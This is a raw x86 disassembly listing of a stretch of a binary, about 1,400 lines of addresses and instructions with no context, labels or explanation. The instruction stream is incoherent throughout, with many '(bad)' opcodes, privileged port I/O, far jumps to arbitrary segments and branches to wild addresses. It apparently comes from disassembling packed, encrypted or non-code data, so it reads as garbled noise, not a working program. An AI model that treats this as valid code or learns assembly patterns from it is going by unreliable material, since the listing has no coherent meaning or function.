  4194b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194b4:	das    
  4194b5:	xchg   edi,eax
  4194b6:	cwde   
  4194b7:	push   es
  4194b8:	ret    0x3ac
  4194bb:	push   esp
  4194bc:	xchg   ebx,eax
  4194bd:	mov    bl,0xa4
  4194bf:	mov    cl,0xa3
  4194c1:	aad    0x4c
  4194c3:	cdq    
  4194c4:	mov    esp,0x41f0c76c
  4194c9:	lahf   
  4194ca:	push   eax
  4194cb:	ret    
  4194cc:	pop    ss
  4194cd:	sbb    BYTE PTR [edi+0x2b],0x8f
  4194d1:	mov    dh,0x6c
  4194d3:	inc    esp
  4194d4:	mov    ebp,0x3702813b
  4194d9:	mov    bl,0xf4
  4194db:	add    BYTE PTR [ebx],cl
  4194dd:	loope  0x419502
  4194df:	cli    
  4194e0:	out    0xc5,eax
  4194e2:	pop    edx
  4194e3:	enter  0xec4,0x61
  4194e7:	nop
  4194e8:	add    bl,BYTE PTR [ebp+0x6ccd714a]
  4194ee:	add    eax,0x64100ccf
  4194f3:	adc    DWORD PTR [esi+0x1065ec64],ebp
  4194f9:	fwait
  4194fa:	add    eax,0x72237246
  4194ff:	xchg   ebp,eax
  419500:	jmp    0xac827caa
  419505:	jmp    DWORD PTR [ebx+edx*8+0x31]
  419509:	fsub   st,st(2)
  41950b:	ins    DWORD PTR es:[edi],dx
  41950c:	scas   eax,DWORD PTR es:[edi]
  41950d:	cmp    al,0x34
  41950f:	or     al,0x4a
  419511:	aam    0x5
  419513:	cmp    dh,BYTE PTR [esp+edi*8+0x5d]
  419517:	inc    edi
  419518:	add    al,0x28
  41951a:	(bad)  
  41951b:	int3   
  41951c:	or     esp,esi
  41951e:	mov    ds:0x5817d50a,eax
  419523:	ja     0x419587
  419525:	or     eax,0xad018dc3
  41952a:	sub    BYTE PTR [edi+0x57],ch
  41952d:	xor    BYTE PTR [ebx-0x678629b4],cl
  419533:	inc    ecx
  419534:	into   
  419535:	jge    0x4194dd
  419537:	push   0xffffffd3
  419539:	dec    eax
  41953a:	push   esp
  41953b:	sub    DWORD PTR [ecx-0x7d2b10af],esp
  419541:	inc    esp
  419542:	out    dx,eax
  419543:	jae    0x419544
  419545:	cdq    
  419546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419547:	mul    BYTE PTR [edx]
  419549:	rol    BYTE PTR [ebx-0x8ed7ed],1
  41954f:	adc    ebx,0xce500570
  419555:	mov    ds:0xfe5b536,eax
  41955a:	stos   BYTE PTR es:[edi],al
  41955b:	push   eax
  41955c:	xor    eax,0x992fcff2
  419561:	add    eax,DWORD PTR [ecx-0x6a]
  419564:	cmp    ch,BYTE PTR [eax-0xee312d5]
  41956a:	cmp    eax,0x3321fb3a
  41956f:	hlt    
  419570:	mov    esi,0x51b67334
  419575:	push   esi
  419576:	inc    edi
  419577:	aaa    
  419578:	xor    edx,DWORD PTR [esi-0x6a]
  41957b:	stc    
  41957c:	inc    ebx
  41957d:	jmp    0xec01:0x4e6307a1
  419584:	(bad)  ds:0x3b5c11da
  41958a:	pop    bp
  41958c:	out    dx,al
  41958d:	ins    DWORD PTR es:[edi],dx
  41958e:	fimul  DWORD PTR [esi+0x4]
  419591:	mov    ds:0xb18e9b5d,eax
  419596:	pop    edi
  419597:	lods   eax,DWORD PTR ds:[esi]
  419598:	adc    eax,0xf2ce4095
  41959d:	and    dh,dh
  41959f:	out    dx,al
  4195a0:	xor    DWORD PTR [ebx],esp
  4195a2:	mov    ebx,0x97b98769
  4195a7:	sti    
  4195a8:	or     BYTE PTR [esi-0x50],cl
  4195ab:	in     al,dx
  4195ac:	push   edi
  4195ad:	and    edx,0x5
  4195b0:	xor    al,0x75
  4195b2:	xchg   ecx,eax
  4195b3:	mov    ds:0x7ddecbbc,al
  4195b8:	jbe    0x4195b3
  4195ba:	in     al,0xe2
  4195bc:	jnp    0x4195f4
  4195be:	mov    al,0x33
  4195c0:	or     cl,BYTE PTR [ebx]
  4195c2:	pop    edi
  4195c3:	cwde   
  4195c4:	cdq    
  4195c5:	arpl   WORD PTR [ecx-0x29e06e11],cx
  4195cb:	loop   0x419614
  4195cd:	xchg   esi,eax
  4195ce:	or     al,0xeb
  4195d0:	std    
  4195d1:	sbb    BYTE PTR [esi+0x3402e356],al
  4195d7:	aad    0x64
  4195d9:	xor    esi,DWORD PTR ds:0x22760ecb
  4195df:	jbe    0x41965b
  4195e1:	jge    0x4195b2
  4195e3:	inc    eax
  4195e4:	xor    edi,DWORD PTR [eax+ecx*2+0x14]
  4195e8:	xor    eax,0x1b618f03
  4195ed:	mov    dh,0xf1
  4195ef:	push   es
  4195f0:	and    BYTE PTR [ecx],dl
  4195f2:	(bad)  
  4195f3:	jge    0x419587
  4195f5:	mov    eax,0xec63a06b
  4195fa:	jmp    0xe7a1:0x6d2f265d
  419601:	aam    0xfe
  419603:	(bad)  
  419604:	popa   
  419605:	add    eax,0xc9e7e58e
  41960a:	stc    
  41960b:	push   ebx
  41960c:	cmp    ch,bl
  41960e:	imul   eax,DWORD PTR [ebx-0x6b],0xffffffd4
  419612:	mov    ds:0x5b827fb9,eax
  419617:	mov    esp,0x4ed512dd
  41961c:	pusha  
  41961d:	das    
  41961e:	mov    bh,0x29
  419620:	nop
  419621:	bound  ecx,QWORD PTR [edi+0x13]
  419624:	dec    eax
  419625:	int3   
  419626:	sbb    bh,bh
  419628:	mov    ah,0xbb
  41962a:	adc    BYTE PTR ds:0x111e28ae,al
  419630:	(bad)  
  419632:	popa   
  419633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419634:	cli    
  419635:	call   0xcd3c:0xe0b79cc9
  41963c:	sub    dh,BYTE PTR [ebx+0x36df5f74]
  419642:	xchg   BYTE PTR [esi],al
  419644:	pop    eax
  419645:	xchg   esi,eax
  419646:	fwait
  419647:	in     eax,dx
  419648:	cld    
  419649:	retf   
  41964a:	adc    esp,0xfec115c7
  419650:	mov    esp,0x63c059b7
  419655:	jmp    FWORD PTR [ebx+ecx*2+0x61caa399]
  41965c:	adc    bl,al
  41965e:	fistp  QWORD PTR ds:0x9974760f
  419664:	jg     0x4196a3
  419666:	or     ah,BYTE PTR [ecx-0x3191990d]
  41966c:	push   edi
  41966e:	aad    0x99
  419670:	jne    0x419660
  419672:	out    0x62,al
  419674:	cmc    
  419675:	sub    esp,ebx
  419677:	sbb    DWORD PTR [ecx+ebp*1+0x64],esp
  41967b:	stos   DWORD PTR es:[edi],eax
  41967c:	test   al,0x6b
  41967e:	not    DWORD PTR [edi-0x76f6ca29]
  419684:	div    DWORD PTR [esi+0x74c4b3ed]
  41968a:	jns    0x4196d2
  41968c:	cmp    esp,ebx
  41968e:	nop
  41968f:	mov    al,0xb5
  419691:	sub    DWORD PTR [esi],ebx
  419693:	test   al,0xc6
  419695:	fucomip st,st(1)
  419697:	xchg   ebp,eax
  419698:	mov    ah,BYTE PTR [ecx-0x30564f1b]
  41969e:	outs   dx,BYTE PTR ds:[esi]
  41969f:	data16 fs sahf 
  4196a2:	fdivp  st(6),st
  4196a4:	inc    eax
  4196a5:	(bad)  
  4196a6:	fs (bad) 
  4196a8:	aad    0x6c
  4196aa:	ss jmp 0x49be6604
  4196b0:	jmp    0x47f4:0x566d4390
  4196b7:	je     0x4196ca
  4196b9:	rol    bl,1
  4196bb:	scas   al,BYTE PTR es:[edi]
  4196bc:	jp     0x41968e
  4196be:	dec    edi
  4196bf:	cdq    
  4196c0:	jnp    0x419717
  4196c2:	add    al,0xb8
  4196c4:	inc    esi
  4196c5:	fcomip st,st(6)
  4196c7:	jnp    0x4196a0
  4196c9:	inc    ecx
  4196ca:	pushf  
  4196cb:	in     al,dx
  4196cc:	in     eax,dx
  4196cd:	jle    0x4196ef
  4196cf:	popa   
  4196d0:	adc    eax,0x49166909
  4196d5:	in     al,dx
  4196d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196d7:	mov    al,ds:0x3b870496
  4196dc:	popf   
  4196dd:	cwde   
  4196de:	push   es
  4196df:	pop    cx
  4196e1:	cmp    DWORD PTR [eax+0x5c65500d],ebx
  4196e7:	lea    eax,[ebp-0x5e95e898]
  4196ed:	jo     0x4196e7
  4196ef:	push   edx
  4196f0:	stos   BYTE PTR es:[edi],al
  4196f1:	or     eax,0x97cf588c
  4196f6:	call   0x6f2c:0x2e25321
  4196fd:	out    dx,al
  4196fe:	jle    0x4196d2
  419700:	sub    ebx,DWORD PTR [ebx-0x48b16b7b]
  419706:	fld    TBYTE PTR [edx+0x1b4e3b5d]
  41970c:	jo     0x419729
  41970e:	push   ecx
  41970f:	fcmove st,st(0)
  419711:	lea    edi,[esi+0x7e590445]
  419717:	push   ebx
  419718:	mov    ?,edi
  41971a:	sbb    DWORD PTR [edx+0x4ff14840],eax
  419720:	push   esi
  419721:	out    0x99,al
  419723:	fst    QWORD PTR [eax+0x6e]
  419726:	inc    eax
  419727:	imul   ecx,DWORD PTR [ebx-0x62811b23],0xfffffff2
  41972e:	scas   eax,DWORD PTR es:[edi]
  41972f:	repnz stos DWORD PTR es:[edi],eax
  419731:	sub    ah,BYTE PTR ds:0x205f8caa
  419737:	cwde   
  419738:	in     al,0xda
  41973a:	dec    edi
  41973b:	xor    BYTE PTR [esi-0x19],dh
  41973e:	push   ss
  41973f:	aaa    
  419740:	pop    eax
  419741:	ror    DWORD PTR [ebx-0x6],1
  419744:	(bad)  
  419745:	icebp  
  419746:	push   eax
  419747:	leave  
  419748:	push   cs
  419749:	add    BYTE PTR [edx+eax*4],0xe3
  41974d:	push   ss
  41974e:	mov    al,0x18
  419750:	push   eax
  419751:	push   ds
  419752:	gs lock jne 0x419791
  419756:	jnp    0x4196e5
  419758:	jae    0x419722
  41975a:	sar    cl,0x44
  41975d:	sbb    DWORD PTR [esp+ebp*4+0x2072cbf4],ecx
  419764:	pushf  
  419765:	adc    ebx,DWORD PTR [eax+0x4cfb62cc]
  41976b:	dec    esp
  41976c:	div    BYTE PTR [eax+0x3dfac758]
  419772:	sti    
  419773:	xor    al,BYTE PTR [ecx]
  419775:	test   DWORD PTR [eax],esp
  419777:	(bad)  
  419779:	or     ebx,DWORD PTR [eax-0x4e01a8d0]
  41977f:	xor    ebp,DWORD PTR [eax]
  419781:	stos   BYTE PTR es:[edi],al
  419782:	mov    ds:0xe30b0762,eax
  419787:	fbstp  TBYTE PTR [ebp-0x33]
  41978a:	or     eax,0x14888cea
  41978f:	ins    DWORD PTR es:[edi],dx
  419790:	ret    0xa117
  419793:	mov    ds:0xe8c95ac4,eax
  419798:	test   al,0xf2
  41979a:	cmp    ah,cl
  41979c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41979d:	es daa 
  41979f:	es push es
  4197a1:	cmp    BYTE PTR es:[ebx+0x17a1fe7e],bl
  4197a8:	xor    dh,BYTE PTR [esi+0x65]
  4197ab:	push   cs
  4197ac:	xlat   BYTE PTR ds:[ebx]
  4197ad:	dec    edx
  4197ae:	std    
  4197af:	adc    dh,dh
  4197b1:	aad    0x64
  4197b3:	push   0xffffff8b
  4197b5:	stc    
  4197b6:	ja     0x4197fa
  4197b8:	cmp    DWORD PTR [edi+0x553021c7],eax
  4197be:	fimul  DWORD PTR [ecx+0x47]
  4197c1:	aas    
  4197c2:	call   0x919bbfa0
  4197c7:	pop    ecx
  4197c8:	loop   0x419764
  4197ca:	in     eax,dx
  4197cb:	loop   0x4197d5
  4197cd:	fiadd  WORD PTR [esi+eiz*2+0x6]
  4197d1:	scas   al,BYTE PTR es:[edi]
  4197d2:	lods   al,BYTE PTR ds:[esi]
  4197d3:	pop    ecx
  4197d4:	push   es
  4197d5:	jbe    0x4197ce
  4197d7:	je     0x419825
  4197d9:	ret    0x5f16
  4197dc:	dec    ebx
  4197dd:	and    eax,0xa93fa736
  4197e2:	mov    ecx,0x79830ddb
  4197e7:	push   es
  4197e8:	out    dx,eax
  4197e9:	shr    BYTE PTR [ebp+0x30c9d679],0x66
  4197f0:	push   ebp
  4197f1:	imul   ecx,DWORD PTR [ebp-0x74a674c],0x41
  4197f8:	test   eax,0x5a1688fb
  4197fd:	dec    eax
  4197fe:	(bad)  
  4197ff:	cmp    ch,dh
  419801:	call   0xd0cc069a
  419806:	mov    BYTE PTR [eax],dl
  419808:	inc    ebx
  419809:	or     edx,ebp
  41980b:	jno    0x4197c0
  41980d:	dec    ebx
  41980e:	mov    edx,0x681a1271
  419813:	shr    BYTE PTR gs:[edi+0x32],cl
  419817:	hlt    
  419818:	sub    al,0xd9
  41981a:	cs in  al,0x61
  41981d:	not    DWORD PTR [edx-0x31]
  419820:	sub    edi,DWORD PTR [edx-0x3b7d826]
  419826:	xchg   DWORD PTR [edi],edx
  419828:	repnz mov esi,0x4d959caf
  41982e:	push   ds
  41982f:	mov    WORD PTR [esi],?
  419831:	rcr    DWORD PTR [esi],cl
  419833:	stos   BYTE PTR es:[edi],al
  419834:	clc    
  419835:	jmp    0x4198b0
  419837:	jne    0x419860
  419839:	cmp    al,0x45
  41983b:	dec    ebp
  41983c:	mov    edi,0x30753498
  419841:	les    edx,FWORD PTR [esi]
  419843:	pusha  
  419844:	jae    0x419861
  419846:	call   DWORD PTR [edi+eax*8]
  419849:	mov    DWORD PTR [ecx],ebx
  41984b:	xchg   ecx,eax
  41984c:	std    
  41984d:	pop    ecx
  41984e:	fcom   QWORD PTR [ebx]
  419850:	in     al,dx
  419851:	arpl   ax,di
  419853:	cmp    ch,bh
  419855:	cmc    
  419856:	jmp    0x5cf95f10
  41985b:	jno    0x419880
  41985d:	inc    edx
  41985e:	adc    bh,BYTE PTR [edi+eiz*4-0x3e]
  419862:	or     al,0x9d
  419864:	sbb    BYTE PTR [edx-0x327de70e],cl
  41986a:	dec    esp
  41986b:	mov    dl,0x70
  41986d:	cmp    DWORD PTR [ebp-0x335f82c9],esi
  419873:	mov    eax,ds:0x5c14aaa4
  419878:	push   eax
  419879:	aas    
  41987a:	push   ebp
  41987b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41987c:	mov    ebp,DWORD PTR [esi+0x6732313e]
  419882:	push   esp
  419883:	shl    esi,1
  419885:	adc    al,0xcc
  419887:	out    0x3b,al
  419889:	or     BYTE PTR [esi-0x6e],bh
  41988c:	mov    ebp,0x8849d202
  419891:	sti    
  419892:	mov    ch,0x70
  419894:	mov    bl,0x3a
  419896:	jle    0x4198cd
  419898:	les    ecx,FWORD PTR es:[eax]
  41989b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41989c:	shl    DWORD PTR [edx+esi*8+0x7f],cl
  4198a0:	inc    ebx
  4198a1:	in     eax,dx
  4198a2:	outs   dx,BYTE PTR ds:[esi]
  4198a3:	jl     0x41986f
  4198a5:	adc    BYTE PTR [edx+0x16d747b0],0xa9
  4198ac:	call   0xaafdaf25
  4198b1:	(bad)  
  4198b2:	pop    ebx
  4198b3:	add    BYTE PTR [ebx],ah
  4198b5:	jnp    0x4198a8
  4198b7:	mov    cl,0xb6
  4198b9:	imul   esp,DWORD PTR [ecx],0xda377667
  4198bf:	stos   DWORD PTR es:[edi],eax
  4198c0:	xor    al,0xea
  4198c2:	sbb    al,0xad
  4198c4:	fadd   QWORD PTR [ecx-0x24b3b3da]
  4198ca:	sbb    edx,esp
  4198cc:	je     0x4198c7
  4198ce:	lds    esp,FWORD PTR ds:0xab5073f3
  4198d4:	jns    0x4198ea
  4198d6:	adc    ecx,esi
  4198d8:	jns    0x4198a5
  4198da:	jnp    0x4198ac
  4198dc:	loopne 0x4198bd
  4198de:	fisttp DWORD PTR [eax]
  4198e0:	or     bh,BYTE PTR [eax+0x29942c40]
  4198e6:	mov    dh,0xf6
  4198e8:	imul   eax,DWORD PTR [esi+0x3d030160],0x1ee5183
  4198f2:	inc    esp
  4198f3:	push   ebx
  4198f4:	retf   0x8a0c
  4198f7:	call   0x76f99549
  4198fc:	ss into 
  4198fe:	inc    esi
  4198ff:	and    DWORD PTR gs:[ebx+0x4ac71c32],ecx
  419906:	cmp    ah,BYTE PTR [ebx+0xd]
  419909:	outs   dx,DWORD PTR ds:[esi]
  41990a:	cld    
  41990b:	div    DWORD PTR [edi+eax*4]
  41990e:	sub    DWORD PTR [edx+0xf],esi
  419911:	cmp    BYTE PTR ds:0x3e1a444b,0x16
  419918:	pop    edi
  419919:	mov    BYTE PTR ds:0xc4960640,bl
  41991f:	cmp    al,BYTE PTR [ecx+0x1a919e10]
  419925:	into   
  419926:	xor    eax,0x8b3a9a52
  41992b:	mov    ds:0xe076f502,eax
  419930:	cmp    BYTE PTR [ecx],bh
  419932:	adc    eax,esp
  419934:	mov    edx,0x47238cd7
  419939:	add    eax,0x52e6f03f
  41993e:	mov    eax,0xc330b306
  419943:	sbb    BYTE PTR [ebp+0x1f],dh
  419946:	pop    ebp
  419947:	jne    0x419933
  419949:	push   es
  41994a:	fisttp WORD PTR [esp+ecx*2]
  41994d:	aam    0x13
  41994f:	push   0x8302a783
  419954:	add    dl,cl
  419956:	and    al,0xb2
  419958:	sar    DWORD PTR [eax+ebp*2],0x32
  41995c:	fs mov ah,0x27
  41995f:	iret   
  419960:	sub    ch,bh
  419962:	loopne 0x419976
  419964:	sub    al,0x58
  419966:	push   eax
  419967:	pop    eax
  419968:	fsub   st,st(7)
  41996a:	jo     0x419906
  41996c:	jno    0x419967
  41996e:	sbb    eax,0x32ee7ba1
  419973:	mov    bl,0x7a
  419975:	popa   
  419976:	icebp  
  419977:	xchg   DWORD PTR ds:0x16974883,edx
  41997d:	cmp    BYTE PTR [ecx-0x16],dl
  419980:	mov    ebp,0x69aefe62
  419985:	xchg   edi,eax
  419986:	icebp  
  419987:	test   eax,0xa3e7acf5
  41998c:	cwd    
  41998e:	je     0x419923
  419990:	inc    esp
  419991:	fisub  DWORD PTR [edi]
  419993:	sub    edi,DWORD PTR [edx-0x64]
  419996:	clc    
  419997:	scas   eax,DWORD PTR es:[edi]
  419998:	rol    BYTE PTR [edx-0x78dacdc5],0x78
  41999f:	dec    ebp
  4199a0:	(bad)  
  4199a1:	js     0x4199aa
  4199a3:	push   0x60
  4199a5:	int    0xca
  4199a7:	call   0x35ebe415
  4199ac:	out    dx,eax
  4199ad:	mov    esi,0x6b23a259
  4199b2:	lods   eax,DWORD PTR ds:[esi]
  4199b3:	aam    0xfa
  4199b5:	mov    ds:0x9d818c49,al
  4199ba:	sbb    al,0xfc
  4199bc:	dec    ebx
  4199bd:	outs   dx,DWORD PTR ds:[esi]
  4199be:	dec    ecx
  4199bf:	push   edx
  4199c0:	sar    BYTE PTR [esi+esi*4+0x0],cl
  4199c4:	sub    eax,0x6db008e4
  4199c9:	xor    eax,0x9227c98d
  4199ce:	jb     0x419a18
  4199d0:	pop    ebp
  4199d1:	pop    ebx
  4199d2:	pop    ss
  4199d3:	mov    DWORD PTR [ebx],esi
  4199d5:	shl    DWORD PTR [ebx-0x1685d55c],1
  4199db:	imul   esi
  4199dd:	sbb    bh,ah
  4199df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199e0:	ret    0xca75
  4199e3:	pop    esp
  4199e4:	lods   al,BYTE PTR ds:[esi]
  4199e5:	imul   edi,DWORD PTR [esi+0x3a],0xffffffc7
  4199e9:	cli    
  4199ea:	push   edx
  4199eb:	add    cl,BYTE PTR [edx]
  4199ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ee:	sbb    bh,BYTE PTR ds:0x49b5e362
  4199f4:	aam    0x4b
  4199f6:	gs dec ecx
  4199f8:	pop    es
  4199f9:	rol    BYTE PTR [ebp+ebp*8-0x7e0c805],0xcc
  419a01:	xchg   ebp,eax
  419a02:	in     al,0xac
  419a04:	sub    DWORD PTR [eax+0x6d46efc],ebp
  419a0a:	cmc    
  419a0b:	and    al,0x9a
  419a0d:	stos   BYTE PTR es:[edi],al
  419a0e:	adc    dh,BYTE PTR [esp+eax*8-0x3c291a24]
  419a15:	adc    al,0x86
  419a17:	js     0x419a77
  419a19:	aas    
  419a1a:	(bad)  
  419a1c:	retf   
  419a1d:	mov    cl,0x3d
  419a1f:	lds    ebx,FWORD PTR [esi]
  419a21:	pop    ss
  419a22:	sub    esi,DWORD PTR [ecx+0x4e2194ed]
  419a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a29:	out    dx,eax
  419a2a:	rol    BYTE PTR [eax+esi*8-0x95f4cf9],1
  419a31:	out    0x72,al
  419a33:	in     eax,dx
  419a34:	add    esp,DWORD PTR [ebx]
  419a36:	cs push ds
  419a38:	cmp    ecx,ecx
  419a3a:	mov    ebp,0x2a8893be
  419a3f:	sahf   
  419a40:	xchg   BYTE PTR [esi+0x54],bh
  419a43:	aam    0x6
  419a45:	sbb    eax,0x34bbf07e
  419a4a:	ins    DWORD PTR es:[edi],dx
  419a4b:	dec    esi
  419a4c:	fsubrp st(1),st
  419a4e:	(bad)  
  419a4f:	in     eax,0x38
  419a51:	mov    cl,0x67
  419a53:	aad    0xba
  419a55:	(bad)  
  419a56:	jp     0x419a2c
  419a58:	popa   
  419a59:	xor    al,0xd4
  419a5c:	mov    WORD PTR [ebp+0x47],cs
  419a5f:	pop    es
  419a60:	mov    al,0x1e
  419a62:	and    al,0x7f
  419a64:	inc    ebp
  419a65:	mov    al,0x68
  419a67:	xchg   esi,eax
  419a68:	inc    eax
  419a69:	call   0xf7ecb6d0
  419a6e:	in     eax,0x9a
  419a70:	int3   
  419a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a72:	xor    al,0xd3
  419a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a75:	bound  ebx,QWORD PTR [edi-0x4c]
  419a78:	jp     0x419a81
  419a7a:	mov    edx,DWORD PTR [ecx-0x555314ef]
  419a80:	adc    dh,BYTE PTR [ebx-0x5ec12686]
  419a86:	repnz and esi,eax
  419a89:	repnz xor ebx,ebx
  419a8c:	jmp    0x419abf
  419a8e:	scas   eax,DWORD PTR es:[edi]
  419a8f:	push   ebx
  419a90:	jbe    0x419a1a
  419a92:	stos   DWORD PTR es:[edi],eax
  419a93:	xchg   ah,dl
  419a95:	mov    bh,0x64
  419a97:	mov    cl,0xc6
  419a99:	add    bh,BYTE PTR [eax+0x2625f463]
  419a9f:	call   0xf028aec0
  419aa4:	jmp    0xd304:0xa1af40bc
  419aab:	adc    DWORD PTR [ebp-0x4d],esp
  419aae:	fdivr  DWORD PTR [eax]
  419ab0:	in     al,0x43
  419ab2:	adc    ebp,DWORD PTR [edx-0x57105a37]
  419ab8:	add    eax,0x10355a8b
  419abd:	xchg   ebp,eax
  419abe:	in     al,dx
  419abf:	ins    BYTE PTR es:[edi],dx
  419ac0:	pop    ebx
  419ac1:	aaa    
  419ac2:	mov    fs,ecx
  419ac4:	fs mov ebp,eax
  419ac7:	call   0x1f49:0xcbf10330
  419ace:	scas   al,BYTE PTR es:[edi]
  419acf:	pop    es
  419ad0:	inc    esi
  419ad1:	add    esi,DWORD PTR [eax-0x70]
  419ad4:	cmp    al,0x73
  419ad6:	call   0x81a7561d
  419adb:	inc    eax
  419adc:	adc    BYTE PTR [esi],dh
  419ade:	mov    ebx,DWORD PTR [esi]
  419ae0:	cdq    
  419ae1:	push   edx
  419ae2:	push   ebp
  419ae3:	bound  edi,QWORD PTR [ebp-0x7325272c]
  419ae9:	push   ebx
  419aea:	xor    BYTE PTR [edx-0x7c1498c8],dh
  419af0:	jecxz  0x419b66
  419af2:	repz icebp 
  419af4:	scas   eax,DWORD PTR es:[edi]
  419af5:	int3   
  419af6:	mov    bh,0xf6
  419af8:	jg     0x419abd
  419afa:	loop   0x419acb
  419afc:	in     eax,0x17
  419afe:	push   0xffffff8d
  419b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b01:	and    DWORD PTR [edx],0xdc9d286d
  419b07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b08:	mov    dl,0xe6
  419b0a:	sti    
  419b0b:	mov    dh,0x9e
  419b0d:	retf   0x82e8
  419b10:	stos   DWORD PTR es:[edi],eax
  419b11:	jmp    0x39a7:0x190e8198
  419b18:	(bad)  
  419b19:	test   eax,0x9a28558a
  419b1e:	push   cs
  419b1f:	aaa    
  419b20:	mov    dh,0x2a
  419b22:	sbb    al,dh
  419b24:	rcr    esi,0x5b
  419b27:	pop    esi
  419b28:	js     0x419aff
  419b2a:	inc    edx
  419b2b:	jae    0x419b51
  419b2d:	xor    ebp,ebp
  419b2f:	ror    ah,1
  419b31:	mov    esp,0x39ebd9d1
  419b36:	int    0xc3
  419b38:	arpl   ax,bp
  419b3a:	xchg   BYTE PTR [ecx+0x5a],bh
  419b3d:	in     al,dx
  419b3e:	mov    ecx,DWORD PTR [ebx-0x7f]
  419b41:	xlat   BYTE PTR ds:[ebx]
  419b42:	mov    esi,0xf0f47f3d
  419b47:	lahf   
  419b48:	jp     0x419b27
  419b4a:	retf   0x3a8a
  419b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b4e:	retf   
  419b4f:	jo     0x419b0d
  419b51:	xchg   edx,eax
  419b52:	imul   esi,DWORD PTR [esi+esi*2-0x5f],0xb70fc555
  419b5a:	pop    ss
  419b5b:	mov    BYTE PTR [edx-0x309bb148],ah
  419b61:	adc    BYTE PTR [ebx],dl
  419b63:	sbb    ah,al
  419b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b66:	push   edx
  419b67:	iret   
  419b68:	pop    ds
  419b69:	xchg   ecx,eax
  419b6a:	stc    
  419b6b:	jecxz  0x419b65
  419b6d:	aaa    
  419b6e:	cdq    
  419b6f:	sahf   
  419b70:	fist   DWORD PTR [edx+0x36]
  419b73:	mov    dh,0xc
  419b75:	xchg   esp,eax
  419b76:	pop    es
  419b77:	cmp    ch,BYTE PTR [edi+0x10d8902a]
  419b7d:	dec    ecx
  419b7e:	lds    ebp,FWORD PTR [ecx+0x67ab290d]
  419b84:	fistp  QWORD PTR [esp+edx*2]
  419b87:	sbb    dl,bh
  419b89:	mov    ah,0xe4
  419b8b:	xchg   edi,eax
  419b8c:	js     0x419bed
  419b8e:	cmp    DWORD PTR ds:0x39140a1a,ecx
  419b94:	inc    ebx
  419b95:	jl     0x419bf1
  419b97:	lahf   
  419b98:	xchg   bl,bl
  419b9a:	aaa    
  419b9b:	mov    dl,0x13
  419b9d:	out    dx,eax
  419b9e:	lods   al,BYTE PTR ds:[esi]
  419b9f:	ss dec edi
  419ba1:	jbe    0x419b2b
  419ba3:	inc    di
  419ba5:	into   
  419ba6:	js     0x419b66
  419ba8:	inc    esi
  419ba9:	jb     0x419b71
  419bab:	ins    DWORD PTR es:[edi],dx
  419bac:	mov    edi,0xeb76f0aa
  419bb1:	(bad)  
  419bb2:	out    0xdd,al
  419bb4:	mov    edx,0xed35f668
  419bb9:	mov    cl,0x60
  419bbb:	xchg   ebp,eax
  419bbc:	mov    edx,0xab5696a9
  419bc1:	lods   eax,DWORD PTR ds:[esi]
  419bc2:	adc    eax,0x7320df96
  419bc7:	mov    al,0x5e
  419bc9:	mov    eax,ds:0xa53cfc6b
  419bce:	xchg   ebp,eax
  419bcf:	cs lock jl 0x419c3c
  419bd3:	jg     0x419b90
  419bd5:	or     eax,0x75c93c94
  419bda:	mov    edx,0x6f9a4f11
  419bdf:	aaa    
  419be0:	sub    edi,eax
  419be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419be3:	or     DWORD PTR [ecx+0x51d1c48c],0x8d85945a
  419bed:	test   al,0xe3
  419bef:	test   ax,0x2e8e
  419bf3:	xchg   DWORD PTR [ebx+0x114be2c5],edx
  419bf9:	fsub   DWORD PTR [edx]
  419bfb:	ror    BYTE PTR [edi],0x1a
  419bfe:	xor    eax,0xc9b6b89
  419c03:	mov    BYTE PTR [ecx-0x799e9d81],al
  419c09:	outs   dx,BYTE PTR ds:[esi]
  419c0a:	mov    eax,0x8553d082
  419c0f:	scas   eax,DWORD PTR es:[edi]
  419c10:	rol    ecx,1
  419c12:	jl     0x419c08
  419c14:	stos   BYTE PTR es:[edi],al
  419c15:	rcl    ch,1
  419c17:	lods   al,BYTE PTR ds:[esi]
  419c18:	cli    
  419c19:	push   ebx
  419c1a:	out    dx,eax
  419c1b:	sub    BYTE PTR [edx],bh
  419c1d:	xchg   esi,eax
  419c1e:	jnp    0x419c7c
  419c20:	xor    al,0xdc
  419c22:	jecxz  0x419bbd
  419c24:	sbb    eax,0x1b9e5bc2
  419c29:	fwait
  419c2a:	or     eax,0xd036739a
  419c2f:	cmc    
  419c30:	cmp    edi,edx
  419c32:	mov    edi,0xc19a0792
  419c37:	pop    ss
  419c38:	and    eax,0x9e3fc87c
  419c3d:	and    esi,DWORD PTR [esi+ebx*1+0x52]
  419c41:	cld    
  419c42:	sub    BYTE PTR [ebx+ecx*1],ch
  419c45:	fnstsw WORD PTR [edx+edi*8+0x55]
  419c49:	popa   
  419c4a:	fdiv   DWORD PTR [edx-0x72590da]
  419c50:	adc    BYTE PTR [ebx+eiz*4],dl
  419c53:	outs   dx,BYTE PTR ds:[esi]
  419c54:	jns    0x419c24
  419c56:	adc    esi,DWORD PTR [ebx+0x2b62a57c]
  419c5c:	jecxz  0x419c78
  419c5e:	fmulp  st(2),st
  419c60:	call   0xa31690d0
  419c65:	pop    esp
  419c66:	jl     0x419cac
  419c68:	nop
  419c69:	gs mov bl,0x25
  419c6c:	inc    ebp
  419c6d:	jnp    0x419c12
  419c6f:	or     al,0x8a
  419c71:	lea    edi,[esi+0x43]
  419c74:	out    dx,al
  419c75:	nop
  419c76:	fisub  DWORD PTR [ebx+0xe]
  419c79:	pop    esp
